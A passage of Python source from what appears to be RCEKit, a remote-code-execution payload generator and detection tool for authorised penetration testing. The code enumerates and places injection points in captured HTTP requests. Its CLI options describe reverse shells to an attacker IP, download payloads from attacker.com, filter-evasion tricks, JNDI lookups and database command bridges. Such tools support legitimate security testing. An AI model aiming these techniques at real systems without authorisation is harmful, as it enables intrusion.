        boundary = _multipart_boundary(headers, body or "")
        parts = _split_multipart(body or "", boundary) if boundary else None
        fields = [_multipart_field_name(head) for head, _c in parts or []]
        # A name posted by more than one part is addressed by index and labelled
        # by it, so a finding says which part carried it.
        repeated = {name for name in fields if name and fields.count(name) > 1}
        for index, field in enumerate(fields if "multipart" in selected else []):
            if not field:
                continue
            label = f"multipart field '{field}'"
            if field in repeated:
                label += f" (part {index + 1})"
            points.append(InjectionPoint("multipart", field, label, (index,)))
    elif stripped[:1] in "{[" and "json" in selected:
        try:
            parsed = json.loads(body)
        except (ValueError, TypeError, RecursionError):
            # RecursionError belongs here for the same reason it does in the
            # response-channel parser: json's scanner recurses in C, and a
            # deeply nested captured body would otherwise end `-p all` with a
            # traceback instead of an enumeration.
            parsed = None
        if parsed is not None:
            for tokens in _order_graphql_leaves(parsed, _json_leaf_tokens(parsed)):
                rendered = _render_json_path(tokens)
                points.append(InjectionPoint("json", rendered,
                                             f"JSON field '{rendered}'", tokens))
    elif starts_xml_body(stripped):
        # Chosen by the body's own shape, and deliberately not folded into the
        # form branch below -- which is where an XML body used to land. A SOAP
        # envelope carries `=` in its prolog and in every attribute, so
        # splitting it on `&` yielded exactly one point named `<?xml version`
        # that no probe could confirm, while every element and attribute in the
        # document went untested. The kind filter is therefore applied *inside*
        # the branch: `--auto-params form` against an envelope now finds no body
        # point rather than a point that tests nothing, because coverage
        # reported and not delivered reads exactly like a clean target.
        if "xml" in selected and not xml_body_is_signed(body):
            for kind, path, start, end in _xml_value_spans(body or ""):
                points.append(InjectionPoint(
                    "xml", path, f"XML {_XML_POINT_NOUNS[kind]} '{path}'", (start, end)))
    elif "=" in (body or "") and "form" in selected:
        for pair in body.split("&"):
            key, sep, _ = pair.partition("=")
            if sep and key:
                points.append(InjectionPoint("form", key, f"body param '{key}'"))

    if "cookie" in selected:
        for name, value in headers:
            if name.lower() != "cookie":
                continue
            for crumb in value.split(";"):
                key, sep, _ = crumb.strip().partition("=")
                if sep and key.strip():
                    points.append(InjectionPoint("cookie", key.strip(),
                                                 f"cookie '{key.strip()}'"))

    if "header" in selected:
        present = [name for name, _ in headers if name.lower() not in NON_INJECTABLE_HEADERS]
        high_yield = [n for n in HIGH_YIELD_HEADERS
                      if any(n.lower() == p.lower() for p in present)]
        ordered = list(high_yield)
        if thorough:
            ordered += [p for p in present
                        if not any(p.lower() == h.lower() for h in high_yield)]
        seen_headers: Set[str] = set()
        for name in ordered:
            actual = next((p for p in present if p.lower() == name.lower()), name)
            if actual.lower() in seen_headers:
                continue
            seen_headers.add(actual.lower())
            points.append(InjectionPoint("header", actual, f"header '{actual}'"))

    if include_path_segments and "path" in selected:
        path_part, _, _ = target.partition("?")
        for index, segment in enumerate(path_part.split("/")):
            if segment:
                points.append(InjectionPoint("path", str(index),
                                             f"path segment {index} ('{segment}')"))
    return points


def place_injection_point(target: str, headers: List[List[str]], body: str,
                          point: InjectionPoint, mark: str
                          ) -> Optional[Tuple[str, List[List[str]], str]]:
    """Put ``mark`` at ``point``. ``None`` when the point is no longer there.

    Each kind is rewritten in its own serialization -- a JSON leaf through the
    JSON encoder, a form field in the ``a=1&b=2`` blob, a header as a single
    line -- so the value is escaped by the layer that owns it rather than
    blanket-encoded for all of them."""
    if point.kind == "query":
        path, sep, query = target.partition("?")
        if not sep:
            return None
        marked = _mark_urlencoded_param(query, point.name, mark)
        return (f"{path}?{marked}", headers, body) if marked is not None else None
    if point.kind == "json":
        try:
            parsed = json.loads(body)
        except (ValueError, TypeError, RecursionError):
            return None
        if not _set_json_tokens(parsed, point.tokens, mark):
            return None
        return target, headers, json.dumps(parsed)
    if point.kind == "xml":
        # The offsets are the authority, as ``tokens`` is for a JSON leaf, and
        # the document is spliced rather than re-emitted so a signed or
        # whitespace-significant envelope survives byte for byte outside the
        # value under test. The span is re-derived and matched on both its path
        # and its bounds: a point built from a different capture would
        # otherwise overwrite whatever happens to sit at those offsets here.
        if len(point.tokens) != 2:
            return None
        start, end = point.tokens
        if not any(path == point.name and span_start == start and span_end == end
                   for _kind, path, span_start, span_end in _xml_value_spans(body or "")):
            return None
        return target, headers, (body or "")[:start] + mark + (body or "")[end:]
    if point.kind == "form":
        marked = _mark_urlencoded_param(body, point.name, mark)
        return (target, headers, marked) if marked is not None else None
    if point.kind == "multipart":
        boundary = _multipart_boundary(headers, body or "")
        parts = _split_multipart(body or "", boundary or "") if boundary else None
        if not parts:
            return None
        # The index is the authority, as ``tokens`` is for a JSON leaf. Several
        # parts may share a name -- a multi-file input posts every file under
        # one -- and matching on the name alone rewrote the first of them for
        # every candidate, so each later part was probed nowhere and reported
        # as covered. The name is still checked, so a point that no longer
        # describes the body places nothing rather than the wrong part.
        wanted = point.tokens[0] if point.tokens else None
        rebuilt: List[List[str]] = []
        found = False
        for index, (head, content) in enumerate(parts):
            here = _multipart_field_name(head)
            hit = (index == wanted and here == point.name) if wanted is not None \
                else (not found and here == point.name)
            if hit:
                content, found = mark, True
            rebuilt.append([head, content])
        if not found:
            return None
        return target, headers, _render_multipart(rebuilt, boundary or "")
    if point.kind == "cookie":
        for index, (name, value) in enumerate(headers):
            if name.lower() != "cookie":
                continue
            marked = _mark_cookie(value, point.name, mark)
            if marked is not None:
                new_headers = [list(h) for h in headers]
                new_headers[index][1] = marked
                return target, new_headers, body
        return None
    if point.kind == "header":
        for index, (name, _value) in enumerate(headers):
            if name.lower() == point.name.lower():
                new_headers = [list(h) for h in headers]
                new_headers[index][1] = mark
                return target, new_headers, body
        return None
    if point.kind == "path":
        path, sep, query = target.partition("?")
        segments = path.split("/")
        try:
            index = int(point.name)
        except ValueError:
            return None
        if not 0 <= index < len(segments):
            return None
        segments[index] = mark
        rebuilt = "/".join(segments)
        return (f"{rebuilt}?{query}" if sep else rebuilt), headers, body
    return None


def _mark_urlencoded_param(blob: str, param: str, mark: str) -> Optional[str]:
    """Replace ``param``'s value with ``mark`` in a ``a=1&b=2`` blob (query or
    form body). Returns the rewritten blob, or None if ``param`` is absent."""
    if not blob:
        return None
    found = False
    out: List[str] = []
    for pair in blob.split("&"):
        key, _, _value = pair.partition("=")
        if key == param:
            out.append(f"{key}={mark}")
            found = True
        else:
            out.append(pair)
    return "&".join(out) if found else None


def _mark_json_field(body: str, param: str, mark: str) -> Optional[str]:
    """Set top-level JSON field ``param`` to ``mark``. Returns the re-serialised
    body, or None if the body is not a JSON object containing ``param``."""
    try:
        obj = json.loads(body)
    except (ValueError, TypeError):
        return None
    if isinstance(obj, dict) and param in obj:
        obj[param] = mark
        return json.dumps(obj)
    return None


def _mark_cookie(value: str, param: str, mark: str) -> Optional[str]:
    """Replace cookie ``param``'s value with ``mark`` in a Cookie header value.
    Returns the rewritten value, or None if ``param`` is absent."""
    found = False
    out: List[str] = []
    for cookie in value.split(";"):
        key, _, _value = cookie.strip().partition("=")
        if key.strip() == param:
            out.append(f"{key.strip()}={mark}")
            found = True
        else:
            out.append(cookie.strip())
    return "; ".join(out) if found else None


def _place_param_marker(target, headers, body, param, mark):
    """Insert ``mark`` at parameter ``param``, trying query > body > header >
    cookie. Returns ``(target, headers, body, description)`` or raises if the
    parameter is nowhere to be found."""
    path, sep, query = target.partition("?")
    if sep:
        marked_query = _mark_urlencoded_param(query, param, mark)
        if marked_query is not None:
            return f"{path}?{marked_query}", headers, body, f"query param '{param}'"
    stripped = body.strip()
    if stripped[:1] in "{[":
        marked = _mark_json_field(body, param, mark)
        if marked is not None:
            return target, headers, marked, f"JSON field '{param}'"
    if "=" in body:
        marked = _mark_urlencoded_param(body, param, mark)
        if marked is not None:
            return target, headers, marked, f"body param '{param}'"
    for i, (name, _value) in enumerate(headers):
        if name.lower() == param.lower() and name.lower() != "cookie":
            new_headers = [list(h) for h in headers]
            new_headers[i][1] = mark
            return target, new_headers, body, f"header '{name}'"
    for i, (name, value) in enumerate(headers):
        if name.lower() == "cookie":
            marked = _mark_cookie(value, param, mark)
            if marked is not None:
                new_headers = [list(h) for h in headers]
                new_headers[i][1] = marked
                return target, new_headers, body, f"cookie '{param}'"
    raise ValueError(f"parameter '{param}' not found in query, body, headers, or cookies")


def _infer_request_scheme(host: str) -> str:
    """Pick the scheme for a raw request whose capture does not record one.

    A ``Host`` header carries a port only when it is not the scheme's default,
    so a portless capture is 80 or 443 and cannot say which. RCEKit keeps http
    for that case, deliberately: its targets are lab ranges, CTF boxes and
    internal applications, which are routinely plain http on a portless host,
    and defaulting to https would leave those unreachable out of the box.

    That default can send a captured session in cleartext, so the risk is
    surfaced rather than silently defaulted away: the CLI reports the inferred
    scheme, and warns outright when the request carries a credential header
    that plain http would expose. ``--request-scheme`` settles it either way,
    and an explicit port is authoritative."""
    _, _, port = host.rpartition(":")
    if not port.isdigit():
        return "http"           # no port recorded; http keeps lab targets reachable
    return "https" if port == "443" else "http"


def build_request_inputs(text: str, param: Optional[str] = None,
                         scheme: Optional[str] = None, mark: str = "FUZZ",
                         point: Optional[InjectionPoint] = None
                         ) -> Tuple[str, str, Optional[str], List[str], str]:
    """Build ``(url, method, data, headers, injection)`` from a raw HTTP request,
    with ``mark`` placed at the injection point. Precedence: an explicit
    ``point`` (enumeration), then an inline ``FUZZ`` already in the request, then
    an inline ``*`` marker, then ``-p NAME``.

    ``point`` wins over an inline marker because enumeration is asking about a
    specific candidate; honouring a leftover marker instead would silently test
    the same place for every candidate."""
    if point is not None:
        req = parse_raw_request(text)
        placed = place_injection_point(req["target"], req["headers"], req.get("body", ""),
                                       point, mark)
        if placed is None:
            raise ValueError(f"injection point not found: {point.label}")
        target, headers, body = placed
        host = req["host"]
        if not host:
            raise ValueError("raw request has no Host header; cannot build an absolute URL")
        if scheme is None:
            scheme = _infer_request_scheme(host)
        out_headers = [f"{name}: {value}" for name, value in headers
                       if name.lower() not in {"host", "content-length"}]
        return (f"{scheme}://{host}{target}", req["method"], body or None,
                out_headers, point.label)
    inline = False
    if mark in text:
        inline = True
    elif "*" in text:
        # First `*` is the injection marker (commix-style). A request that
        # legitimately contains `*` (e.g. `Accept: */*`) should use FUZZ or -p.
        text = text.replace("*", mark, 1)
        inline = True

    req = parse_raw_request(text)
    method, target, headers, body, host = (
        req["method"], req["target"], req["headers"], req["body"], req["host"])
    if not host:
        raise ValueError("raw request has no Host header; cannot build an absolute URL")

    if inline:
        injection = "inline marker"
    elif param:
        target, headers, body, injection = _place_param_marker(target, headers, body, param, mark)
    else:
        raise ValueError("no injection point: add a FUZZ or * marker, or pass -p NAME")

    if scheme is None:
        scheme = _infer_request_scheme(host)
    url = f"{scheme}://{host}{target}"
    # Drop Host and Content-Length: urllib recomputes both from the URL and the
    # (marker-lengthened) body.
    out_headers = [f"{name}: {value}" for name, value in headers
                   if name.lower() not in {"host", "content-length"}]
    data = body if body else None
    return url, method, data, out_headers, injection


# Selector fields a profile may give as a list of names or as one
# comma-separated string. Normalised to a list, because a bare string handed
# to the generator would be iterated *character by character* -- "unix" would
# select nothing at all, silently.
_PROFILE_LIST_FIELDS = ("environments", "contexts", "categories", "encodings",
                        "sink_decodes")
# Fields whose string form main() already knows how to split itself.
_PROFILE_STRING_OR_LIST_FIELDS = ("separators", "eval_engines")


def validate_target_profile(profile: Any) -> Dict[str, Any]:
    """Check a loaded target profile's shape and normalise its selector fields,
    raising ``ValueError`` with an operator-readable message.

    A profile is a file someone writes by hand, so the failure to design for is
    a typo: a number where a character set belongs, a bare string where a list
    does. Left unchecked those surface far from their cause -- as a ``TypeError``
    deep in the payload filter, or as a run that quietly generates nothing.
    Every check here guards a field the caller goes on to join, index, or
    compare."""
    if not isinstance(profile, dict):
        raise ValueError(f"a target profile must be a JSON object, not "
                         f"{type(profile).__name__}.")

    def _names(field: str, value: Any) -> List[str]:
        if isinstance(value, str):
            return [part.strip() for part in value.split(",") if part.strip()]
        if isinstance(value, (list, tuple)) and all(isinstance(v, str) for v in value):
            return list(value)
        raise ValueError(f"'{field}' must be a string or a list of strings, "
                         f"not {type(value).__name__}.")

    for field in _PROFILE_LIST_FIELDS:
        if profile.get(field) is not None:
            profile[field] = _names(field, profile[field])
    for field in _PROFILE_STRING_OR_LIST_FIELDS:
        if profile.get(field) is not None and not isinstance(profile[field], str):
            _names(field, profile[field])

    deny = profile.get("deny_chars")
    # A string is already a set of characters; a list is joined into one.
    if deny is not None and not isinstance(deny, str):
        _names("deny_chars", deny)

    length = profile.get("max_length")
    if length is not None and (isinstance(length, bool) or not isinstance(length, int)):
        raise ValueError(f"'max_length' must be a whole number, not "
                         f"{type(length).__name__}.")

    request = profile.get("request")
    if request is not None and not isinstance(request, dict):
        raise ValueError(f"'request' must be a JSON object, not "
                         f"{type(request).__name__}.")
    return profile


def load_token_manifest(path: str) -> Dict[str, Dict[str, Any]]:
    """Load a .map.jsonl manifest into a token -> entry dict."""
    tokens: Dict[str, Dict[str, Any]] = {}
    try:
        with open(path, "r", encoding="utf-8") as manifest:
            for line in manifest:
                line = line.strip()
                if not line:
                    continue
                entry = json.loads(line)
                if entry.get("token"):
                    tokens[entry["token"]] = entry
    except Exception as exc:
        logger.error("Unable to load manifest %s: %s", path, exc)
    return tokens


def main(argv: Optional[List[str]] = None) -> int:
    """CLI entry point. Returns the process exit status: ``0`` when the
    requested run completed (including a verification that confirmed nothing —
    that is a result, not a failure) and ``1`` when RCEKit could not carry the
    run out at all: unusable corpus or profile, missing consent, an unreadable
    or unmarked request, or an invalid option combination. Scripts and CI can
    therefore branch on the status instead of scraping stdout.

    ``argv`` defaults to ``sys.argv[1:]``. Taking it as an argument is what lets
    a test drive the CLI in-process, and what keeps the console-script entry
    point (``rcekit = "rcekit:main"``) a plain zero-argument call."""
    configure_logging()
    parser = argparse.ArgumentParser(description="Generate RCE payloads for penetration testing")
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    parser.add_argument("-o", "--output", default="rce_payloads.txt",
                       help="Output file path (default: rce_payloads.txt)")
    parser.add_argument("--attacker-ip", default="192.168.1.100",
                       help="Attacker IP for reverse shells (default: 192.168.1.100)")
    parser.add_argument("--attacker-domain", default="attacker.com",
                       help="Attacker domain for download payloads (default: attacker.com)")
    parser.add_argument("--max-payloads", type=int, default=None,
                       help="Maximum number of payloads to generate (default: unlimited)")
    parser.add_argument("--contexts", nargs="+", default=None,
                       help="Contexts to generate, including raw (default: all compatible contexts)")
    parser.add_argument("--categories", nargs="+", default=None,
                       help="Categories to generate (default: all)")
    parser.add_argument("--encodings", nargs="+", default=None,
                       help="Encoding methods to apply (default: mode-specific)")
    parser.add_argument("--environments", nargs="+", default=None,
                       help="Environments to generate (default: all)")
    parser.add_argument("--template-file", type=str, default=None,
                        help="Path to a custom JSON payload template file")
    parser.add_argument("--detection-only", action="store_true",
                        help="Generate benign payloads for detection and validation")
    parser.add_argument("--output-format", choices=["text", "jsonl", "burp", "ffuf", "nuclei"], default="text",
                        help="text/jsonl single file, burp (per-context wordlists + optional Burp request), ffuf (wordlists + ready request.txt/run.sh when a profile request is given), or nuclei (runnable templates)")
    parser.add_argument("--oob-domain", default=None,
                        help="Collaborator/interactsh domain for out-of-band payloads; each payload gets a unique subdomain token")
    parser.add_argument("--verify-url", default=None,
                        help="AUTHORISED target URL with a FUZZ marker; fires payloads and confirms execution via each payload's oracle instead of writing a file")
    parser.add_argument("--verify-method", default=None,
                        help="HTTP method for --verify-url (default GET, or POST when --verify-data is set)")
    parser.add_argument("--verify-data", default=None,
                        help="Request body for verification; put FUZZ where the payload goes")
    parser.add_argument("--verify-header", action="append", default=None,
                        help="Header 'Name: value' for verification (repeatable); may contain FUZZ")
    parser.add_argument("--verify-delay", type=float, default=0.0,
                        help="Seconds to wait between verification requests (rate limiting)")
    parser.add_argument("--verify-timeout", type=float, default=8.0,
                        help="Per-request timeout for verification (seconds)")
    parser.add_argument("--insecure", action="store_true",
                        help="Drop every TLS assurance for verification/detection requests: no "
                             "certificate verification, no hostname check, and OpenSSL's security "
                             "level and minimum protocol version lowered so a legacy stack (old "
                             "ciphers, small keys, TLS 1.0) still completes a handshake. Self-signed "
                             "certs and dated software are the norm on internal targets, so this is "
                             "an explicit opt-in; ignored for HTTP targets")
    parser.add_argument("--verify-url-location", choices=["query_value", "url_path", "raw"], default="query_value",
                        help="How to encode the payload where FUZZ appears in --verify-url "
                             "(default query_value: percent-encoded, as a query parameter)")
    parser.add_argument("--verify-body-location",
                        choices=["json_string", "form_value", "xml_text", "xml_attr",
                                 "xml_cdata", "raw"], default=None,
                        help="How to encode the payload where FUZZ appears in --verify-data "
                             "(default: auto-detected from Content-Type/body shape, and for an XML "
                             "body from the marker's own position). json_string "
                             "escapes for a JSON body WITHOUT percent-encoding; form_value percent-"
                             "encodes for x-www-form-urlencoded; xml_text and xml_attr apply XML "
                             "character escaping, which the target's parser undoes, the attribute "
                             "form also escaping both quotes; xml_cdata leaves the payload alone "
                             "except for the sequence that would end the section; raw sends it "
                             "verbatim — which is what an envelope the application scrapes with a "
                             "regex rather than parses needs")
    parser.add_argument("--verify-allow-destructive", action="store_true",
                        help="Allow --verify-url to fire destructive payloads (persistence/backdoors/etc.); off by default")
    parser.add_argument("--verify-active-risk", choices=["safe", "intrusive", "stateful"], default=None,
                        help="Highest safety tier --verify-url may fire (default: safe). The default holds "
                             "back reverse shells, download-execute, credential access, lateral movement, "
                             "container escape, cloud-metadata and OOB payloads; pass 'intrusive' to include "
                             "them. Independent of --max-safety, which only governs file output")
    parser.add_argument("-r", "--request-file", default=None,
                        help="Raw HTTP request file (as captured by a proxy) to inject into, as an "
                             "alternative to --verify-url. Mark the injection point with FUZZ or *, or "
                             "select a parameter with -p. The request's method, path, headers, body and "
                             "cookies are reused, each encoded for the context it lands in.")
    parser.add_argument("-p", "--param", action="append", default=None,
                        help="Parameter/field/header/cookie to inject into for -r (precedence: query > body "
                             "> header > cookie). Pass 'all' to enumerate every candidate in the capture "
                             "instead of naming one.")
    parser.add_argument("--auto-params", default=None, metavar="KINDS",
                        help="(-r with --methods) Enumerate injection points instead of naming one. "
                             f"Comma-separated kinds from {', '.join(INJECTION_POINT_KINDS)}, or 'all'. "
                             "Query values, JSON leaves addressed by path, XML elements, attributes "
                             "and CDATA sections addressed the same way, form fields, cookie values "
                             "and headers each get their own encoding. Implied by '-p all'.")
    parser.add_argument("--point-order", choices=["fast", "thorough"], default="fast",
                        help="(enumeration) 'fast' (default) tries query, body, cookies and a curated "
                             "high-yield header list; 'thorough' also tries every remaining "
                             "non-hop-by-hop header.")
    parser.add_argument("--max-points", type=int, default=40, metavar="N",
                        help="(enumeration) Stop after N candidates. A budget guard, not a filter: the "
                             "run says how many it dropped.")
    parser.add_argument("--include-path-segments", action="store_true", default=False,
                        help="(enumeration) Also inject into URL path segments. Off by default: rewriting "
                             "a path segment usually just produces a 404, which costs a request and "
                             "proves nothing.")
    parser.add_argument("--request-scheme", choices=["http", "https"], default=None,
                        help="Scheme for the URL built from -r (default: https when the Host is on :443, "
                             "otherwise http — a portless capture cannot record which, and http keeps "
                             "lab and internal targets reachable). The inferred scheme is printed, and "
                             "a request carrying credential headers over plain http is flagged.")
    parser.add_argument("--webroot", default=None,
                        help="(file-based detection) server-side directory the target can write to and "
                             "serve, e.g. /var/www/html. Convenience alias for --file-write-path "
                             "when the read-back channel is a web root.")
    parser.add_argument("--web-base-url", default=None,
                        help="(file-based detection) base URL that serves --webroot, e.g. "
                             "https://target.example. Convenience alias for "
                             "--file-read-url '<base>/{name}'.")
    parser.add_argument("--file-write-path", default=None, metavar="DIR",
                        help="(--methods file) server-side directory the target can write to, e.g. "
                             "/tmp. Pairs with --file-read-url. Unlike --webroot this does not have "
                             "to be served by a web server — anything the target can read back works.")
    parser.add_argument("--file-read-url", default=None, metavar="URL",
                        help="(--methods file) URL template that reads the written file back. "
                             "Placeholders: {name} (filename), {path} (full server-side path), "
                             "{path_enc} (that path percent-encoded). This is what generalises the "
                             "method past a writable web root — an LFI endpoint, a download/export "
                             "handler or an attachment fetcher is a read-back channel too, e.g. "
                             "--file-write-path /tmp --file-read-url "
                             "'https://target/download?f={path_enc}'.")
    parser.add_argument("--time-base", type=float, default=2.0,
                        help="(time-based detection) base delay N in seconds; the regression fires "
                             "0/N/2N and requires the response time to track it (default: 2.0).")
    parser.add_argument("--evade", choices=list(EVASION_RUNGS), default="high",
                        help="(--methods) How far to climb when a filter REFUSES a probe. Every probe "
                             "is sent canonical first; only a refused one is retried, and only up to "
                             "this ceiling. 'low' removes whitespace (${IFS}); 'high' (default) also "
                             "splits the command word (ec$@ho), for a filter matching command names; "
                             "'none' never retries and sends canonical payloads only. Applying a rung "
                             "to every probe instead was measured to break 8 probe shapes and improve "
                             "none, which is why it is a retry rather than a posture.")
    parser.add_argument("--separators", default=None,
                        help="(--methods) Comma-separated command separators the shell probes try to "
                             "break out with, e.g. \"; ,| ,&& \". Default sweeps '; ', '| ', '|| ', "
                             "'&& ' and a newline, so a sink that filters ';' is still reached; "
                             "write a newline as \\n. Narrow it (e.g. --separators '; ') to cut the "
                             "request count when the sink's shape is already known. Ignored with "
                             "--sink-raw, which sends bare commands.")
    parser.add_argument("--probe-depth", choices=["quick", "full"], default="full",
                        help="(--methods) How many probe shapes to try per sink. 'full' (default) also "
                             "sends the substitution-free (awk) and comment-terminated "
                             "variants, which reach sinks that strip '$(' and backticks, filter command "
                             "words, or append a redirect after the injection point — roughly twice the "
                             "requests. 'quick' sends only the canonical probes, for rate-limited targets "
                             "or when the sink's shape is already known.")
    parser.add_argument("--oob-host", default=None,
                        help="(--methods oob/lookup/deser) Host the TARGET should call back to: a domain "
                             "delegated to this listener, or an IP it can reach. Required for --methods "
                             "oob and lookup; optional for deser, whose shape oracle needs no listener at "
                             "all. The built-in HTTP+DNS listener runs in-process and the verdict rests on "
                             "the callback. An IP serves oob alone, which carries its token in the URL "
                             "path — lookup and deser have nowhere but a DNS label to put one, so both "
                             "need a delegated name. Makes the target open outbound connections, so it "
                             "never runs unless you name the host.")
    parser.add_argument("--methods", default=None,
                        help="Comma-separated RCE detection methods to run against --verify-url/-r instead of "
                             "the classic per-payload oracle. Available: reflected (results-based execution "
                             "proof via computed arithmetic); eval (SSTI/SpEL/OGNL/Groovy/raw-eval via a "
                             "computed product); file (self-OOB write+read-back, needs --file-write-path "
                             "and --file-read-url, or the --webroot/--web-base-url alias); write (the inverse "
                             "of file — your request stores a file and RCEKit executes it, needs "
                             "--write-url-template; file-write for a write that is served but not "
                             "interpreted); oob (DNS/HTTP callback to the built-in listener, needs "
                             "--oob-host — confirms a sink with no output channel and no writable web root); "
                             "lookup (an expression-lookup sink in Log4Shell's shape, which resolves a "
                             "${jndi:...} URI rather than shelling out, needs a DNS name delegated to the "
                             "listener for --oob-host and builds nothing from an address literal — "
                             "reaches lookup-sink, never executed); "
                             "time (hardened blind-timing regression, reaches timing-sink, never executed); "
                             "deser (proves the endpoint deserializes attacker data — deserialization-sink "
                             "via a non-executing DNS gadget, which needs the same delegated --oob-host "
                             "name lookup does, and needs-review for the listener-free shape "
                             "differential, which is a fingerprint and not a proven sink, "
                             "never executed); "
                             "boolean (a sink that evaluates a predicate and renders nothing of it, "
                             "read from a response-shape differential across randomised true/false "
                             "predicates — reaches evaluation-sink, never executed, because a query engine "
                             "comparing two numbers produces the same differential). "
                             "Opt-in and additive: when omitted, verification keeps its existing behaviour "
                             "unchanged.")
    parser.add_argument("--detect-json", default=None, metavar="PATH",
                        help="(--methods) Also write the detection results to PATH as JSON: the run's "
                             "overall verdict, per-verdict counts, and every probe with its payload, "
                             "method, context and evidence. Text output is unchanged. Use this instead "
                             "of scraping stdout — a probe payload may contain a literal newline, and "
                             "the process exit status does not distinguish a confirmation from a clean "
                             "negative.")
    parser.add_argument("--verify-chain", default=None,
                        help="Path to a JSON chain profile: deliver each payload through a multi-step, "
                             "session-aware flow (login/CSRF -> prerequisites -> payload delivery -> trigger) "
                             "and confirm in-band (match oracle) or out-of-band (a {callback} URL to the "
                             "built-in listener). Reaches authenticated, file-content and blind/async sinks.")
    parser.add_argument("--doctor", action="store_true",
                        help="Run a corpus integrity check (template found, parses, payload counts) and exit non-zero if it is missing or empty")
    parser.add_argument("--listen", action="store_true",
                        help="Run the built-in OOB listener (HTTP+DNS) that records callbacks and correlates them to payload tokens")
    parser.add_argument("--listen-http-port", type=int, default=8080,
                        help="HTTP port for the OOB listener (default 8080)")
    parser.add_argument("--listen-dns-port", type=int, default=5335,
                        help="UDP DNS port for the OOB listener (default 5335; use 53 for real DNS, needs root + NS delegation)")
    parser.add_argument("--listen-answer-ip", default="127.0.0.1",
                        help="IP returned by the listener's DNS answers (default 127.0.0.1)")
    parser.add_argument("--correlate", default=None,
                        help="A .map.jsonl manifest to correlate received tokens back to their payloads")
    parser.add_argument("--listen-log", default=None,
                        help="Append received OOB hits to this file as JSONL")
    parser.add_argument("--include-metadata", action="store_true",
                        help="Write indicator and safety metadata alongside payload output")
    parser.add_argument("--max-safety", choices=["safe", "intrusive", "stateful"], default=None,
                        help="Highest safety tier to include")
    parser.add_argument("--include-blocking", action="store_true",
                        help="Include blocking or timing-based payloads that are excluded by default")
    parser.add_argument("--acknowledge-consent", action="store_true",
                        help="Acknowledge that exploitation payloads will only be used with proper authorization")
    parser.add_argument("--watermark", action="store_true",
                        help="Embed a traceable watermark token into each exploitation payload (audit logging happens either way)")
    parser.add_argument("--target-profile", default=None,
                        help="JSON profile describing the target (environments, contexts, categories, encodings, deny_chars, max_length, oob_domain); CLI flags override it")
    parser.add_argument("--deny-chars", default=None,
                        help="Drop payloads containing any of these characters (e.g. \"'\\\"\" for a target that rejects quotes)")
    parser.add_argument("--max-length", type=int, default=None,
                        help="Drop payloads longer than this many characters")
    parser.add_argument("--sink-needs-separator", action="store_true", default=None,
                        help="Sink concatenates input mid shell command: keep only separator-led payloads")
    parser.add_argument("--sink-raw", action="store_true", default=None,
                        help="(--methods) Sink runs the injected input as the whole command "
                             "(no surrounding command to break out of, e.g. a qx/$input/ sink): "
                             "send shell probes as bare commands ONLY. Narrowing alias for "
                             "--sink-shape raw; the ladder already tries the raw shape alongside "
                             "the others, so this is for cutting requests once you know the sink.")
    parser.add_argument("--eval-engines", default=None, metavar="ENGINES",
                        help="(--methods eval) Comma-separated engine carriers to add to the "
                             "bare expression probes, or 'auto' (default) for all of them. "
                             "Carriers exist only for engines a bare expression cannot "
                             "confirm — freemarker (groups digits: 2,070,761,401), velocity "
                             "(${a*b} is a reference, not an expression), thymeleaf (needs its "
                             "inlining brackets), liquid (no * operator at all; multiplies with "
                             "a filter) and django (no arithmetic by design; multiplies with a "
                             "tag). Every other engine measured is covered by the bare probes, "
                             "sandboxed or not, so narrowing this saves little.")
    parser.add_argument("--confirm-depth", default="first", choices=("first", "every"),
                        help="(--methods) How much to keep proving once a carrier -- one "
                             "method in one environment and context -- has confirmed. "
                             "'first' (default) stops that carrier there; every other "
                             "carrier still runs in full, so a sink reachable only as "
                             "another environment is never missed. 'every' maps every "
                             "shape the sink accepts, which is what writing a proof of "
                             "concept by hand needs. The run reports how many shapes it "
                             "held back either way.")
    parser.add_argument("--sink-shape", default=None, metavar="SHAPES",
                        help="(--methods) Which sink shapes the shell probes try, comma-separated: "
                             f"auto (default, the whole ladder) or any of {', '.join(SINK_SHAPE_RUNGS)}. "
                             "sep/chain/newline vary the command separator; raw sends the bare "
                             "command; sq/dq break out of a surrounding quote; subshell reaches a "
                             "quoted value through $(...) and backticks without closing the quote. "
                             "Narrow it to cut request count once the sink's shape is known.")
    parser.add_argument("--deser-formats", default=None, metavar="NAMES",
                        help="(--methods deser) Serialization ecosystems to probe: auto "
                             "(default, all of them) or names from the corpus 'deser_probes' "
                             "section. The deser method proves an endpoint DESERIALIZES "
                             "attacker data; it never reports RCE, because reaching execution "
                             "from there depends on classpath gadgets RCEKit cannot see.")
    parser.add_argument("--bridges", default=None, metavar="NAMES",
                        help="(--methods) Query-language bridges to carry the command probes "
                             "through: none (default), auto, or names from the corpus 'bridges' "
                             "section. A bridge hands a shell command to the OS from inside a "
                             "query language -- COPY FROM PROGRAM, xp_cmdshell, expect:// -- so "
                             "reflected/time/oob prove execution through it with no new oracle. "
                             "Off by default because a bridge payload is SQL or XML syntax: on an "
                             "ordinary shell sink it is a request that cannot confirm. A stateful "
                             "bridge also needs --verify-active-risk stateful.")
    parser.add_argument("--observe-url", default=None, metavar="URL",
                        help="(--methods) Second-order execution: an endpoint POLLED for the "
                             "computed value after the probes are sent. Use it when execution "
                             "happens on a different request than injection -- stored SSTI "
                             "rendered on a profile page, a payload written to a log a template "
                             "later renders, a queued job. Still differential, so it reaches "
                             "executed: the value must be absent from this endpoint's "
                             "pre-injection control.")
    parser.add_argument("--observe-request", default=None, metavar="FILE",
                        help="(--methods) Raw HTTP request for the observed endpoint, instead of "
                             "--observe-url. No FUZZ marker: it is read, never injected into. Use "
                             "this when the page the payload renders on needs a session.")
    parser.add_argument("--observe-poll", type=float, default=5.0, metavar="SECONDS",
                        help="(--observe-url) Seconds between polls of the observed endpoint "
                             "(default 5).")
    parser.add_argument("--observe-timeout", type=float, default=60.0, metavar="SECONDS",
                        help="(--observe-url) Stop polling the observed endpoint after this many "
                             "seconds (default 60). One poll always happens, even at 0.")
    parser.add_argument("--write-url-template", default=None, metavar="URL",
                        help="(--methods write) URL the file written through the injection point "
                             "is served at, e.g. https://target/uploads/rcekit-probe.jsp. Required "
                             "for the write method: it is the channel the proof comes back on. "
                             "The filename is yours — it is whatever your own request writes — so "
                             "point this at exactly that file.")
    parser.add_argument("--write-lang", default=None, metavar="LANGS",
                        help="(--methods write) File types to write, comma-separated: auto "
                             "(default, inferred from the --write-url-template extension) or any "
                             f"of {', '.join(sorted(WriteThenExecute.LANGUAGES))}. jsp/aspx/erb "
